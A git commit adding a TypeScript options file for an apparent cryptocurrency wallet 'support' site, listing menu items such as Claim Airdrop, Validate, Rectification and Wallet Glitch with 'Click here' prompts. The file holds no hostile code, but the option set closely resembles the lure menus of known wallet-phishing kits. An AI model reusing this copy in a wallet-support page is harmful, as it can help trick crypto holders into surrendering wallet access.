a83bad25457127aa89c87e3b1b5a59f06d3ed1de
codewithaudrey <fantasticaudrey001@gmail.com>
2024-07-07 09:35:08 +0100

    added options data

---
+++ src/data/options.ts
@@ -0,0 +1,133 @@
+import {
+  TbArrowsDiff,
+  TbShadow,
+  TbBowlChopsticks,
+  TbGiftCard,
+  TbDroplets,
+  TbPlayerPause,
+  TbCoins,
+  TbCodeAsterisk,
+  TbElevator,
+  TbLinkPlus,
+  TbInputCheck,
+  TbFaceIdError,
+  TbReceiptDollar,
+  TbQrcode,
+  TbChartArrowsVertical,
+  TbLogin2,
+  TbRefresh,
+  TbStack,
+  TbSquareX,
+  TbTallymarks,
+  TbHexagonPlus,
+} from 'react-icons/tb';
+
+const options = [
+  {
+    icon: TbArrowsDiff,
+    title: 'Migration',
+    body: 'Click here to migrate seamlessly with no hassle.',
+  },
+  {
+    icon: TbShadow,
+    title: 'NFTs',
+    body: 'Click here to mint/transfer nfts or need support on how to receive nfts?',
+  },
+  {
+    icon: TbBowlChopsticks,
+    title: 'Swap/Exchange',
+    body: 'We will support you in any related issues with swaping and/or exchange of coins.',
+  },
+  {
+    icon: TbGiftCard,
+    title: 'Claim reward',
+    body: 'Click here for reward claiming or any related issues.',
+  },
+  {
+    icon: TbDroplets,
+    title: 'Claim Airdrop',
+    body: 'Click here for airdrop claiming or any related issues.',
+  },
+  {
+    icon: TbPlayerPause,
+    title: 'Transaction Delay',
+    body: 'Click here for stuck/delayed transactions.',
+  },
+  {
+    icon: TbCoins,
+    title: 'Buy Coins/Tokens',
+    body: 'To trade, your account must be marked as a trusted payment source.',
+  },
+  {
+    icon: TbCodeAsterisk,
+    title: 'Missing/Irregular balance',
+    body: 'Click here for missing or irregular funds.',
+  },
+  {
+    icon: TbElevator,
+    title: 'Bridge Transfer',
+    body: 'Do you have any issue while trying to transfer tokens between chains?',
+  },
+  {
+    icon: TbLinkPlus,
+    title: 'Claim V2',
+    body: 'Do you have any issue while trying to claim your v2?',
+  },
+  {
+    icon: TbInputCheck,
+    title: 'Validate',
+    body: 'Click here to start validation.',
+  },
+  {
+    icon: TbFaceIdError,
+    title: 'Wallet Glitch/Error',
+    body: 'Click here if you have any glitch issues on your wallet.',
+  },
+  {
+    icon: TbReceiptDollar,
+    title: 'High Fees',
+    body: 'Click here if you are facing an increase in transaction fees.',
+  },
+  {
+    icon: TbQrcode,
+    title: 'Whitelist',
+    body: 'Click here for help whitelisting your wallet for nfts.',
+  },
+  {
+    icon: TbChartArrowsVertical,
+    title: 'Stacking',
+    body: 'Click here for tokens/coins staking related issues.',
+  },
+  {
+    icon: TbLogin2,
+    title: 'Login issues',
+    body: 'Click here if you encounter any issues logging in to your wallet.',
+  },
+  {
+    icon: TbRefresh,
+    title: 'Rectification',
+    body: 'Click here for rectification related issues.',
+  },
+  {
+    icon: TbStack,
+    title: 'Slippage',
+    body: 'Click here for slippage related issues.',
+  },
+  {
+    icon: TbSquareX,
+    title: 'Revoke Transactions',
+    body: 'Click here for transaction related issues.',
+  },
+  {
+    icon: TbTallymarks,
+    title: 'RPC Issues',
+    body: 'Click here for RPC related issues.',
+  },
+  {
+    icon: TbHexagonPlus,
+    title: 'Other issues',
+    body: 'Click here for other issues not listed above.',
+  },
+];
+
+export default options;
